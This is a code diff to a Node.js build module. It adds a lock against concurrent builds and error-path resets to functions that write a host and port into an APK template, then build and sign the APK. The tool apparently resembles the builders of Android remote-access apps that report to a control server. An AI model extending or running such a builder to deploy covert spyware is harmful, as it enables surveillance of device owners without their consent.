@@ -35,40 +35,71 @@ function javaversion(callback) {
     });
 }
 
+let isBuilding = false;
+
 function patchAPK(URI, PORT, cb) {
+    if (isBuilding) return cb('Another build is currently in progress. Please wait.');
+    isBuilding = true;
+
     // Sanitize URI and PORT
-    if (!/^[a-zA-Z0-9.-]+$/.test(URI)) return cb('Invalid URI');
+    if (!/^[a-zA-Z0-9.-]+$/.test(URI)) {
+        isBuilding = false;
+        return cb('Invalid URI');
+    }
     let portInt = parseInt(PORT);
-    if (isNaN(portInt) || portInt < 2048 || portInt > 25565) return cb('Invalid Port');
+    if (isNaN(portInt) || portInt < 2048 || portInt > 25565) {
+        isBuilding = false;
+        return cb('Invalid Port');
+    }
 
     if (portInt <= 25565) {
         fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
-            if (err) return cb('File Patch Error - READ')
+            if (err) {
+                isBuilding = false;
+                return cb('File Patch Error - READ');
+            }
             
             // Patch 3: Guard against missing markers
             let startIdx = data.indexOf("http://");
             let endIdx = data.indexOf("?model=");
-            if (startIdx === -1 || endIdx === -1) return cb('Corrupted APK Template - Markers Missing');
+            if (startIdx === -1 || endIdx === -1) {
+                isBuilding = false;
+                return cb('Corrupted APK Template - Markers Missing');
+            }
 
             var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
             fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
-                if (err) return cb('File Patch Error - WRITE')
-                else return cb(false)
+                if (err) {
+                    isBuilding = false;
+                    return cb('File Patch Error - WRITE')
+                } else {
+                    // building will continue in buildAPK, so we keep isBuilding true
+                    return cb(false)
+                }
             });
         });
-    } else return cb(false); // Patch 4: Ensure callback fires even if port is 25565
+    } else {
+        isBuilding = false;
+        return cb(false);
+    }
 }
 
 function buildAPK(cb) {
     javaversion(function (err, version) {
         if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
-            if (error) return cb('Build Command Failed - ' + error.message);
-            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
+            if (error) {
+                isBuilding = false;
+                return cb('Build Command Failed - ' + error.message);
+            } else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
+                isBuilding = false;
                 if (!error) return cb(false);
                 else return cb('Sign Command Failed - ' + error.message);
             });
         });
-        else return cb(err);
+        else {
+            isBuilding = false;
+            return cb(err);
+        }
     })
 }
 
